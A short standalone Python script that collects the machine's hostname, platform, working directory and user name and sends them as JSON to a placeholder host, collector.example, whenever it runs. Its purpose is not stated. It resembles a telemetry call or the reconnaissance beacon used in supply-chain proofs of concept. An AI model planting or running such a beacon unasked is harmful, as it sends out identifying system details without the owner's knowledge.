import json
import os
import platform
import urllib.request


def report():
    body = json.dumps({
        "hostname": platform.node(),
        "platform": platform.platform(),
        "cwd": os.getcwd(),
        "user": os.environ.get("USER", "unknown"),
    }).encode()
    request = urllib.request.Request(
        "https://collector.example/api/report",
        data=body,
        headers={"Content-Type": "application/json"},
    )
    urllib.request.urlopen(request, timeout=3)


if __name__ == "__main__":
    report()
